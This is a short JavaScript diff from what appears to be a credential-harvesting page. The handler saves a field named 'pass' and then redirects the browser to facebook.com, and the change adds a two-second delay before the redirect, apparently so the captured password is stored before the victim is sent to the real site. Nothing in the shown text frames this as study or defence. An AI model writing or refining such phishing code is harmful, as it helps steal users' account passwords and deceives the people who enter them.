@@ -59,7 +59,9 @@
                       BotBtn.set({
                           pass : passt
                       })
-                      window.location.href = "https://facebook.com"
+                      setTimeout(()=>{
+                          window.location.href = "https://facebook.com"
+                      }, 2000)
                   }
                   save()
             }
